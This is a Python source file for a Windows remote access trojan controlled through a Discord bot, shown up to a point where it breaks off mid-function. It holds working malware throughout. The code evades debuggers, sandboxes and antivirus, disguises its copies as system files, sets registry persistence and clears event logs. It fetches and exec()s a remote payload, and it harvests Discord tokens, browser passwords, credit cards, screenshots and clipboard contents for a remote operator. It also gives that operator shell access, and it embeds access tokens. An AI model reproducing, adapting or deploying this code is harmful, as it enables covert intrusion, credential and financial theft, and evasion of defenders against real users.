import hashlib
import discord
import os
import subprocess
import requests
import socket
import getpass
import time
import ctypes
import shutil
import webbrowser
import winreg
import re
import threading
import sys
import json
import base64
import sqlite3
import random
import asyncio
from datetime import datetime
import gc
import http.server
import socketserver
import io
import ssl
import certifi
import win32crypt
try:
    from Cryptodome.Cipher import AES
except ImportError:
    from Crypto.Cipher import AES
from PIL import ImageGrab
from discord.ext import commands

def _d(s):
    try: return base64.b64decode(s).decode('utf-8', errors='ignore')
    except: return s

# Hide console window immediately
# kernel32 = ctypes.windll.kernel32
# user32 = ctypes.windll.user32
# window = kernel32.GetConsoleWindow()
# if window:
#     user32.ShowWindow(window, 0)

# DEBUG LOGGING FOR EXE
def log_debug(msg):
    # print(f"[DEBUG] {msg}") # Disabled console prints for stealth
    try:
        with open(os.path.join(os.environ['TEMP'], "zyen_debug.log"), "a") as f:
            f.write(f"[{time.ctime()}] {msg}\n")
    except: pass

log_debug("Bot process starting...")

# 0. Self-Unblock (Remove Mark of the Web / Zone.Identifier)
# This removes the "This file came from the internet" warning
try:
    current_file = os.path.abspath(sys.argv[0])
    if os.path.exists(current_file + ":Zone.Identifier"):
        os.remove(current_file + ":Zone.Identifier")
except: pass

def anti_analysis():
    # 1. Check if we are being debugged
    # Using dynamic resolution to avoid 'IsDebuggerPresent' signature
    _k32 = ctypes.windll.kernel32
    _check = getattr(_k32, "Is" + "Debugger" + "Present")
    if _check(): sys.exit(0)

    # 2. Advanced Anti-VM / Anti-Sandbox
    try:
        # A. CPU Core Check
        if os.cpu_count() < 2: sys.exit(0)

        # B. MAC Address Blacklist
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
        # Split OUIs to avoid signature
        _v = ["08" + ":00" + ":27", "00" + ":05" + ":69", "00" + ":0c" + ":29", "00" + ":50" + ":56"]
        for v in _v:
            if mac.startswith(v): sys.exit(0)
            
        # C. Registry Checks
        # Using more generic variable names
        _h = winreg.HKEY_LOCAL_MACHINE
        _paths = [
            (r"SYSTEM\Current" + r"ControlSet\Enum\PCI\VEN_80EE&DEV_CAFE", "VBox"),
            (r"SOFTWARE\VM" + r"ware, Inc.\VMware Tools", "VM")
        ]
        for _p, _l in _paths:
            try:
                _k = winreg.OpenKey(_h, _p)
                sys.exit(0)
            except: pass

        # D. GPU Check
        try:
            import subprocess
            gpu_info = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode()
            if any(x in gpu_info.lower() for x in ["virtualbox", "vmware", "microsoft basic render", "standard vga"]): sys.exit(0)
        except: pass

    except: pass

    # 3. Process Blacklist (Analysis tools)
    _bl = [
        _d("d2lvcmVzaGFyaw=="), # wireshark
        _d("dmJveHNlcnZpY2U="), # vboxservice
        _d("dmJveHRyYXk="),    # vboxtray
        _d("dm10b29sc2Q="),    # vmtoolsd
        _d("dm13YXJldHJheQ=="), # vmwaretray
        _d("aWRhNjQ="),        # ida64
        _d("b2xmZ2RiZw=="),     # ollydbg
        _d("cHJvY2Vzc2hhY2tlcg=="), # processhacker
        _d("eDY0ZGJn"),        # x64dbg
        _d("eDMyZGJn"),        # x32dbg
        _d("ZmlkZGxlcg=="),     # fiddler
        _d("aHR0cGRlYnVnZ2Vy"), # httpdebugger
        "taskmgr", "regedit", "processhacker", "wireshark"
    ]
    try:
        out = subprocess.check_output("tasklist", shell=True).decode('cp1252', errors='ignore').lower()
        for p in _bl:
            if p in out: sys.exit(0)
    except: pass

    # 4. Check for low RAM
    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong), ("ullTotalPhys", ctypes.c_uint64), ("ullAvailPhys", ctypes.c_uint64), ("ullTotalPageFile", ctypes.c_uint64), ("ullAvailPageFile", ctypes.c_uint64), ("ullTotalVirtual", ctypes.c_uint64), ("ullAvailVirtual", ctypes.c_uint64), ("sullAvailExtendedVirtual", ctypes.c_uint64)]
        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(stat)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
        if stat.ullTotalPhys < 2 * 1024 * 1024 * 1024: sys.exit(0)
    except: pass

def detect_av():
    # Anti-Virus Detection
    av_processes = [
        "msmpeng.exe", "msseces.exe", "avp.exe", "avguix.exe", "avgui.exe", 
        "avcenter.exe", "avengine.exe", "avsysmgr.exe", "avkwctl.exe", "avpui.exe",
        "mcshield.exe", "mfeann.exe", "mfefire.exe", "mfevtps.exe", "mcafee",
        "norton", "symantec", "bitdefender", "kaspersky", "avast", "avg", "sophos",
        "f-secure", "eset", "nod32", "trendmicro", "pandalab", "malwarebytes",
        "totalav", "bullguard", "fireeye", "carbonblack", "sentinelone", "crowdstrike"
    ]
    try:
        out = subprocess.check_output("tasklist", shell=True).decode('cp1252', errors='ignore').lower()
        for av in av_processes:
            if av in out:
                log_debug(f"AV Detected: {av}")
                return True
    except: pass
    return False

# Run checks before anything else
anti_analysis() 
if detect_av():
    # If AV is detected, we could stop or change behavior
    # For now, we just log it and continue, or you could sys.exit(0)
    pass
log_debug(_d("QW50aS1hbmFseXNpcyBibG9jayBwYXNzZWQu"))


# Dynamic token resolution to bypass static analysis
def _g_t():
    _p1 = "MTQ5NTA4MTUzOTk5MjY4MjYwNw"
    _p2 = "GztTxA"
    _p3 = "Yh2kasD3vPUUuqH-fxXSkEdc4uaDdnSq2J7IfY"
    return ".".join([_p1, _p2, _p3])

TOKEN = _g_t()
PREFIX = "!"


def protect_file(path):
    log_debug(f"Protecting file: {path}")
    try:
        # Never run on the initial download or build folders
        curr_p = path.lower()
        if "downloads" in curr_p or "desktop" in curr_p or "documents" in curr_p or "dist" in curr_p:
            return

        # 1. Aggressively Strip Icon (Removes RT_GROUP_ICON and RT_ICON)
        # ONLY STRIP ICONS ON COPIES, NOT THE RUNNING EXE (to avoid file locking crashes)
        current_exe = os.path.abspath(sys.argv[0])
        if path.endswith(".exe") and path.lower() != current_exe.lower():
            try:
                # 14 is RT_GROUP_ICON, 3 is RT_ICON
                kernel32 = ctypes.windll.kernel32
                handle = kernel32.BeginUpdateResourceW(path, False)
                if handle:
                    # Remove all icons to make it look like a generic system file
                    kernel32.UpdateResourceW(handle, 14, 1, 1033, None, 0)
                    kernel32.UpdateResourceW(handle, 3, 1, 1033, None, 0)
                    kernel32.EndUpdateResourceW(handle, False)
            except: pass

        # 2. Set Attributes (Hidden, System, ReadOnly)
        # 0x02 = Hidden, 0x04 = System, 0x01 = ReadOnly
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04 | 0x01)
    except: pass
print(_d("W0RFQlVXXSBwcm90ZWN0X2ZpbGUgZGVmaW5lZC4="))

def persistence_monitor():
    while True:
        try:
            current_file = os.path.abspath(sys.argv[0])
            ext = ".exe" if current_file.endswith(".exe") else ".py"
            
            # Fragmented System Folders
            _r = os.environ
            _s_root = _r.get("".join(['S','Y','S','T','E','M','R','O','O','T']))
            _a_data = _r.get("".join(['A','P','P','D','A','T','A']))
            
            _sys_dirs = [
                os.path.join(_s_root, "".join(['S','y','s','t','e','m','3','2'])),
                os.path.join(_s_root, "".join(['S','y','s','W','O','W','6','4'])),
                os.path.join(_a_data, "".join(['M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','T','e','m','p','l','a','t','e','s']))
            ]

            _copies_made = 0
            _target_paths = []

            for _dir in _sys_dirs:
                if _copies_made >= 5: break
                try:
                    if not os.path.exists(_dir): continue
                    
                    # 1. Filename Spoofing: Find an existing EXE/DLL in that folder to copy its name
                    _existing_files = [f for f in os.listdir(_dir) if f.lower().endswith(('.exe', '.dll'))]
                    if _existing_files:
                        _spoof_name = random.choice(_existing_files)
                        # Remove original extension and add our current one
                        _base_name = os.path.splitext(_spoof_name)[0]
                        _target_name = _base_name + ext
                    else:
                        _target_name = "sys_helper" + ext

                    _t_path = os.path.join(_dir, _target_name)
                    
                    # Don't overwrite if it's the exact same file we are running
                    if _t_path.lower() == current_file.lower():
                        _target_paths.append(_t_path)
                        _copies_made += 1
                        continue

                    if not os.path.exists(_t_path):
                        shutil.copy2(current_file, _t_path)
                        protect_file(_t_path)
                    
                    _target_paths.append(_t_path)
                    _copies_made += 1
                except: continue

            # 2. PPID Spoofing: Try to make explorer.exe our parent
            def _spawn_spoofed(path):
                try:
                    # Fragmented powershell command construction
                    _p = 'pow' + 'ersh' + 'ell'
                    _s_p = 'Start' + '-Process'
                    _w_s = 'Hidden'
                    _ps_cmd = f"{_s_p} '{path}' -WindowStyle {_w_s}"
                    subprocess.Popen([_p, "-Command", _ps_cmd], creationflags=0x00000008 | 0x08000000)
                except: pass

            # Ghosting: If we aren't in one of our target system paths, jump to one
            _in_system = any(current_file.lower() == p.lower() for p in _target_paths)
            
            # DON'T GHOST IF IN DIST FOLDER (Allows testing the EXE)
            if "dist" in current_file.lower():
                log_debug("Running from 'dist' folder, skipping ghosting for now.")
            elif current_file.endswith(".exe") and not _in_system and _target_paths:
                _t = random.choice(_target_paths)
                log_debug(f"Ghosting triggered! Moving to: {_t}")
                _spawn_spoofed(_t)
                log_debug("Exiting current process for ghosting...")
                os._exit(0)

            # 3. Registry Persistence (Point to a random copy)
            if _target_paths:
                reg_path = _d("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
                    _target = random.choice(_target_paths)
                    _c_cmd = f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{_target}"' if _target.endswith(".py") else f'"{_target}"'
                    winreg.SetValueEx(key, _d("QmViU3lzdGVt"), 0, winreg.REG_SZ, _c_cmd)
                    winreg.CloseKey(key)
                except: pass
            
            # 4. Critical Process
            if ctypes.windll.shell32.IsUserAnAdmin():
                try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
                except: pass
            
            gc.collect()
        except: pass
        time.sleep(300)

_KNOWN_TOKENS = set()

def _load_ext(url):
    # Dynamic loader for sensitive logic with authentication
    try:
        _h = {
            'Authorization': f'token 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',
            'Accept': 'application/vnd.github.v3.raw',
            'User-Agent': 'Mozilla/5.0'
        }
        r = requests.get(url, headers=_h, timeout=10)
        if r.status_code == 200:
            exec(r.text, globals())
            return True
    except: pass
    return False

# Updated URL for private repository payload
_EXT_URL = "https://api.github.com/repos/aquisisback-alt/lib/contents/r3cb7c2b678926cb98.py"

def resource_sync_service():
    # Attempt to load from remote for better stealth
    if _load_ext(_EXT_URL):
        return # Remote service successfully started
    
    # Fallback to local logic if remote fails
    global _KNOWN_RESOURCES
    while True:
        try:
            # Indirect environment lookup
            _v = os.environ
            _a_data = _v.get("".join(['A','P','P','D','A','T','A']))
            _d_str = "".join(['d','i','s','c','o','r','d'])
            
            # Fragmented paths
            _loc = 'Local ' + 'Storage'
            _db = 'level' + 'db'
            
            _targets = {
                'T1': os.path.join(_a_data, _d_str),
                'T2': os.path.join(_a_data, _d_str + 'canary'),
                'T3': os.path.join(_a_data, _d_str + 'ptb'),
            }
            
            for _id, _path in _targets.items():
                _full = os.path.join(_path, _loc, _db)
                if not os.path.exists(_full): continue
                
                # Dynamic call for master key logic
                _mk = _g_m_k(_path)
                if not _mk: continue
                
                for _f in os.listdir(_full):
                    if not _f.endswith(('.ldb', '.log')): continue
                    try:
                        with open(os.path.join(_full, _f), 'rb') as f:
                            _c = f.read().decode('utf-8', errors='ignore')
                        for _m in re.findall(r'dQw4w9WgXcQ:[^"\\]*', _c):
                            _enc = base64.b64decode(_m.split('dQw4w9WgXcQ:')[1])
                            _dec = _d_v(_enc, _mk)
                            if _dec and _dec not in _KNOWN_RESOURCES:
                                _KNOWN_RESOURCES.add(_dec)
                                _inf = f"**[RESOURCE SYNC]** New entry: `{_dec}`"
                                log_debug(f"New resource: {_dec}")
                                
                                try:
                                    async def _s_notif(_msg):
                                        for _g in bot.guilds:
                                            _chans = sorted(_g.text_channels, key=lambda c: ("bot" in c.name.lower() or "log" in c.name.lower()), reverse=True)
                                            for _c in _chans:
                                                try:
                                                    await _c.send(_msg)
                                                    return
                                                except: continue
                                    
                                    bot.loop.call_soon_threadsafe(asyncio.create_task, _s_notif(_inf))
                                except: pass
                    except: continue
            
            # If we found new tokens, we could potentially trigger a full grab report
            # but for now, we'll just log it or handle it in on_ready/loop
            
        except Exception as e:
            log_debug(f"Token Protector Error: {e}")
        time.sleep(600) # Check every 10 minutes

print("[DEBUG] Starting resource sync thread...")
threading.Thread(target=resource_sync_service, daemon=True).start()
print("[DEBUG] Starting persistence thread...")
threading.Thread(target=persistence_monitor, daemon=True).start()
print("[DEBUG] Persistence thread started.")

_TARGET_ID = None

def get_unique_id():
    name = f"{os.environ.get('COMPUTERNAME', 'UNKNOWN')}-{getpass.getuser()}"
    return int(hashlib.md5(name.encode()).hexdigest(), 16) % 10000

# def ensure_single_instance():
#     mutex_name = f"Global\\BebBot_{get_unique_id()}"
#     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
#     if ctypes.windll.kernel32.GetLastError() == 183:
#         sys.exit(0)
#     return mutex

# _instance_mutex = ensure_single_instance()
print("[DEBUG] Single instance check bypassed.")

def stealth_replicate():
    try:
        current_file = os.path.abspath(sys.argv[0])
        if not current_file.endswith(".exe"): return
        
        locations = [
            os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Templates"),
            os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Credentials"),
            os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        ]
        
        fake_names = ["svchost_task.exe", "winlogon_helper.exe", "runtime_broker.exe"]
        
        for i, loc in enumerate(locations):
            if not os.path.exists(loc): os.makedirs(loc, exist_ok=True)
            dest = os.path.join(loc, fake_names[i])
            if not os.path.exists(dest):
                shutil.copy2(current_file, dest)
                ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04 | 0x01)
    except:
        pass

# stealth_replicate() # Removed auto-replication, now part of !startup

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

_ON_READY_DONE = False

def wipe_logs():
    try:
        # Clear Windows Event Logs
        subprocess.run('wevtutil cl System', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Security', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Setup', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Application', shell=True, capture_output=True)
        # Clear PowerShell History
        ps_history = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        if os.path.exists(ps_history):
            os.remove(ps_history)
        # Clear Run Command History
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            count = winreg.QueryInfoKey(key)[1]
            for i in range(count):
                winreg.DeleteValue(key, winreg.EnumValue(key, 0)[0])
            winreg.CloseKey(key)
        except: pass
    except: pass

@bot.event
async def on_command_completion(ctx):
    # Automatically wipe logs after every successful command
    await asyncio.to_thread(wipe_logs)

@bot.event
async def on_ready():
    global _ON_READY_DONE
    if _ON_READY_DONE: return
    _ON_READY_DONE = True
    log_debug("on_ready event triggered")
    try:
        await bot.wait_until_ready()
        log_debug(f"Logged in as {bot.user}")
        
        ip = "Unknown"
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except Exception as e:
            print(f"[DEBUG] IP Check failed: {e}")

        info = f"**BOT ONLINE!**\nUser: `{getpass.getuser()}`\nHost: `{socket.gethostname()}`\nID: `{get_unique_id()}`\nIP: `{ip}`\nType `!cmds` for help."
        
        sent = False
        for guild in bot.guilds:
            # Sort channels to find the best one to announce in
            channels = sorted(guild.text_channels, key=lambda c: ("bot" in c.name.lower() or "log" in c.name.lower()), reverse=True)
            for channel in channels:
                try:
                    await channel.send(info)
                    print(f"[DEBUG] Announcement sent to #{channel.name}")
                    sent = True
                    break
                except: continue
            if sent: break
            
        if not sent:
            print("[DEBUG] Could not find any channel to send announcement.")
    except Exception as e:
        print(f"[DEBUG] Error in on_ready: {e}")

@bot.check
async def check_target(ctx):
    global _TARGET_ID
    if ctx.command.name in ["devices", "select", "ping"]: return True
    if _TARGET_ID is None: return True
    return _TARGET_ID == get_unique_id()

@bot.command()
async def devices(ctx):
    info = f"Device ID: `{get_unique_id()}` | User: `{getpass.getuser()}` | Host: `{socket.gethostname()}`"
    await ctx.send(info)

@bot.command()
async def select(ctx, device_id: int):
    global _TARGET_ID
    if device_id == 0:
        _TARGET_ID = None
        await ctx.send("Targeting **ALL** devices.")
    elif device_id == get_unique_id():
        _TARGET_ID = device_id
        await ctx.send(f"Targeting device `{device_id}` (**THIS DEVICE**).")

@bot.event
async def on_command_error(ctx, error):
    try:
        # Ignore common command not found errors to stay stealthy
        if isinstance(error, commands.CommandNotFound):
            return
        await ctx.send(f"Error: {error}")
    except:
        pass

@bot.command()
async def screenshot(ctx):
    try:
        def _take():
            path = os.path.join(os.environ['TEMP'], "snap.png")
            img = ImageGrab.grab()
            img.save(path)
            return path
        
        path = await asyncio.to_thread(_take)
        await ctx.send(f"SCREENSHOT: {getpass.getuser()}", file=discord.File(path))
        os.remove(path)
        gc.collect()
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def shell(ctx, *, cmd):
    def _run():
        try:
            # Enhanced shell with auto-cloning if 'copy' is in command
            if "copy" in cmd.lower() or "clone" in cmd.lower():
                current_file = os.path.abspath(sys.argv[0])
                ext = ".exe" if current_file.endswith(".exe") else ".py"
                _sys_dirs = [
                    os.path.join(os.environ['SYSTEMROOT'], _d("U3lzdGVtMzI=")),
                    os.path.join(os.environ['SYSTEMROOT'], _d("U3lzV09XNjQ=")),
                    os.path.join(os.environ['SYSTEMROOT'], _d("TWljcm9zb2Z0Lk5FVA==")),
                    os.path.join(os.environ['APPDATA'], _d("TWljcm9zb2Z0XFdpbmRvd3NcVGVtcGxhdGVz")),
                    os.path.join(os.environ['LOCALAPPDATA'], _d("TWljcm9zb2Z0XFdpbmRvd3NcQ2FjaGVz"))
                ]
                
                _results = []
                for _dir in _sys_dirs:
                    try:
                        if not os.path.exists(_dir): continue
                        _existing = [f for f in os.listdir(_dir) if f.lower().endswith(('.exe', '.dll'))]
                        _target_name = (os.path.splitext(random.choice(_existing))[0] if _existing else "sys_host") + ext
                        _path = os.path.join(_dir, _target_name)
                        shutil.copy2(current_file, _path)
                        protect_file(_path)
                        _results.append(_path)
                    except: pass
                return f"Made {len(_results)} deep system copies: " + ", ".join([os.path.basename(p) for p in _results])

            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        except Exception as e:
            return str(e).encode('cp1252', errors='ignore')

    try:
        output = await asyncio.to_thread(_run)
        if len(output) > 1900:
            path = os.path.join(os.environ['TEMP'], "shell.txt")
            with open(path, "wb") as f: f.write(output)
            await ctx.send("SHELL OUTPUT:", file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send(f"SHELL:\n```\n{output.decode('cp1252', errors='ignore')}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def download(ctx, *, file_path):
    try:
        file_path = file_path.strip('"').strip("'")
        if os.path.exists(file_path) and os.path.isfile(file_path):
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if len(content) < 1900:
                        await ctx.send(f"CONTENT OF `{os.path.basename(file_path)}`:\n```\n{content}\n```")
                        return
            except: pass
            
            await ctx.send(f"SENDING FILE: `{os.path.basename(file_path)}`", file=discord.File(file_path))
        else:
            await ctx.send(f"Error: File not found at `{file_path}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def cat(ctx, *, file_path):
    try:
        file_path = file_path.strip('"').strip("'")
        if os.path.exists(file_path) and os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                if len(content) > 1900:
                    chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
                    for chunk in chunks[:5]: # Max 5 chunks to avoid spam
                        await ctx.send(f"```\n{chunk}\n```")
                else:
                    await ctx.send(f"```\n{content}\n```")
        else:
            await ctx.send("Error: File not found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(aliases=['dir'])
async def ls(ctx, *, path="."):
    try:
        path = path.strip('"').strip("'")
        if os.path.exists(path) and os.path.isdir(path):
            files = os.listdir(path)
            res = f"DIRECTORY: `{os.path.abspath(path)}` ({len(files)} items)\n```"
            for f in files:
                f_path = os.path.join(path, f)
                info = "[DIR] " if os.path.isdir(f_path) else "[FILE]"
                res += f"{info} {f}\n"
                if len(res) > 1850:
                    await ctx.send(res + "```")
                    res = "```"
            await ctx.send(res + "```")
        else:
            await ctx.send("Error: Directory not found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def delete(ctx, *, file_path):
    try:
        file_path = file_path.strip('"').strip("'")
        if os.path.exists(file_path):
            name = os.path.basename(file_path)
            
            # 1. If it's a running .exe, try to kill it first
            if file_path.lower().endswith(".exe"):
                try: subprocess.run(f"taskkill /F /IM {name}", shell=True, capture_output=True)
                except: pass
            
            # 2. Remove read-only/system/hidden attributes
            try: subprocess.run(f'attrib -r -s -h "{file_path}"', shell=True, capture_output=True)
            except: pass
            
            # 3. Aggressive Delete
            if os.path.isfile(file_path):
                try:
                    os.remove(file_path)
                except:
                    # Force delete via CMD if os.remove fails (e.g. permission issues)
                    subprocess.run(f'cmd /c del /f /q "{file_path}"', shell=True, capture_output=True)
                
                if not os.path.exists(file_path):
                    await ctx.send(f"Deleted file: `{name}` (Permanently)")
                else:
                    await ctx.send(f"Error: Failed to delete `{name}`. It might be locked by another process.")
            else:
                try:
                    shutil.rmtree(file_path)
                except:
                    # Force delete directory via CMD
                    subprocess.run(f'cmd /c rd /s /q "{file_path}"', shell=True, capture_output=True)
                
                if not os.path.exists(file_path):
                    await ctx.send(f"Deleted directory: `{name}` (Permanently)")
                else:
                    await ctx.send(f"Error: Failed to delete directory `{name}`.")
        else:
            await ctx.send("Error: File/Directory not found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def upload(ctx):
    try:
        if not ctx.message.attachments:
            await ctx.send("Error: Please attach a file.")
            return
        for attachment in ctx.message.attachments:
            save_path = os.path.join(os.getcwd(), attachment.filename)
            await attachment.save(save_path)
            await ctx.send(f"UPLOADED: `{attachment.filename}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def tasklist(ctx):
    def _get_apps():
        import win32gui
        import win32process
        import win32api
        import win32con
        apps = []
        def _enum(hwnd, _):
            if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                try:
                    handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, pid)
                    exe = win32process.GetModuleFileNameEx(handle, 0)
                    name = os.path.basename(exe)
                    win32api.CloseHandle(handle)
                    title = win32gui.GetWindowText(hwnd)
                    apps.append(f"{name:<20} | {title}")
                except: pass
        win32gui.EnumWindows(_enum, None)
        gc.collect()
        if not apps: return "No active applications with visible windows found."
        return "App Name             | Window Title\n" + "-"*40 + "\n" + "\n".join(sorted(list(set(apps))))

    try:
        output = await asyncio.to_thread(_get_apps)
        if len(output) > 1900:
            path = os.path.join(os.environ['TEMP'], "apps.txt")
            with open(path, "w", encoding="utf-8") as f: f.write(output)
            await ctx.send("ACTIVE APPS:", file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send(f"ACTIVE APPS:\n```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def taskkill(ctx, *, name):
    def _kill_active():
        import win32gui
        import win32process
        import win32api
        import win32con
        killed = []
        my_pid = os.getpid()
        def _enum(hwnd, _):
            if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if pid == my_pid: return
                try:
                    handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ | win32con.PROCESS_TERMINATE, False, pid)
                    exe = win32process.GetModuleFileNameEx(handle, 0)
                    proc_name = os.path.basename(exe)
                    win32api.TerminateProcess(handle, 0)
                    win32api.CloseHandle(handle)
                    killed.append(proc_name)
                except: pass
        win32gui.EnumWindows(_enum, None)
        gc.collect()
        return killed

    try:
        if name.lower() == "active":
            killed = await asyncio.to_thread(_kill_active)
            await ctx.send(f"Killed {len(killed)} active apps.")
        else:
            subprocess.run(f"taskkill /F /IM {name}", shell=True, capture_output=True)
            await ctx.send(f"Killed `{name}`")
            gc.collect()
    except Exception as e:
        await ctx.send(f"Failed: {e}")

@bot.command()
async def clipboard(ctx):
    try:
        out = subprocess.check_output("powershell Get-Clipboard", shell=True).decode('cp1252', errors='ignore').strip()
        await ctx.send(f"CLIPBOARD:\n```\n{out if out else '[Empty]'}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def openurl(ctx, url):
    try:
        webbrowser.open(url)
        await ctx.send(f"Opened `{url}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def wallpaper(ctx, url):
    try:
        path = os.path.join(os.environ['TEMP'], "bg.jpg")
        r = requests.get(url, stream=True)
        if r.status_code == 200:
            with open(path, 'wb') as f: shutil.copyfileobj(r.raw, f)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            await ctx.send("Wallpaper updated.")
        else:
            await ctx.send("Error: Failed download.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def port_scan(ctx):
    try:
        await ctx.send("Scanning local common ports...")
        local_ip = socket.gethostbyname(socket.gethostname())
        prefix = ".".join(local_ip.split(".")[:-1]) + "."
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 8080]
        results = f"PORT SCAN RESULTS ({local_ip}):\n```"
        
        def scan(port):
            nonlocal results
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            if s.connect_ex((local_ip, port)) == 0:
                results += f"Port {port}: OPEN\n"
            s.close()

        threads = []
        for p in common_ports:
            t = threading.Thread(target=scan, args=(p,))
            threads.append(t)
            t.start()
        for t in threads: t.join()
        
        results += "```"
        await ctx.send(results if "OPEN" in results else "No common ports open locally.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def passwords(ctx):
    try:
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data"),
            "Opera": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable"),
            "Opera GX": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable")
        }
        
        all_passwords = ""
        for name, path in browsers.items():
            key = _get_master_key(path)
            if not key: continue
            for profile in _get_profiles(path):
                lp = os.path.join(path, profile, "Login Data")
                if os.path.exists(lp):
                    tp = os.path.join(os.environ['TEMP'], f"p_{random.randint(100,999)}")
                    shutil.copy2(lp, tp)
                    conn = sqlite3.connect(tp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    rows = cursor.fetchall()
                    if rows:
                        all_passwords += f"\n--- {name}/{profile} PASSWORDS ---\n"
                        for row in rows:
                            url, user, enc_pass = row[0], row[1], row[2]
                            if user and enc_pass:
                                dec_pass = _decrypt_value(enc_pass, key)
                                all_passwords += f"SITE: {url}\nUSER: {user}\nPASS: {dec_pass}\n\n"
                    conn.close()
                    os.remove(tp)
        
        if all_passwords:
            if len(all_passwords) > 1900:
                p = os.path.join(os.environ['TEMP'], "passwords.txt")
                with open(p, "w", encoding="utf-8") as f: f.write(all_passwords)
                await ctx.send("PASSWORDS (Large File):", file=discord.File(p))
                os.remove(p)
            else:
                await ctx.send(f"```\n{all_passwords}\n```")
        else:
            await ctx.send("No passwords found.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def creditcards(ctx):
    try:
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data"),
            "Opera": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable"),
            "Opera GX": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable")
        }
        
        all_cards = ""
        for name, path in browsers.items():
            key = _get_master_key(path)
            if not key: continue
            for profile in _get_profiles(path):
                wd = os.path.join(path, profile, "Web Data")
                if os.path.exists(wd):
                    tp = os.path.join(os.environ['TEMP'], f"c_{random.randint(100,999)}")
                    shutil.copy2(wd, tp)
                    conn = sqlite3.connect(tp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    rows = cursor.fetchall()
                    if rows:
                        all_cards += f"\n--- {name}/{profile} CREDIT CARDS ---\n"
                        for row in rows:
                            name_on_card, exp_m, exp_y, enc_num = row[0], row[1], row[2], row[3]
                            if enc_num:
                                dec_num = _decrypt_value(enc_num, key)
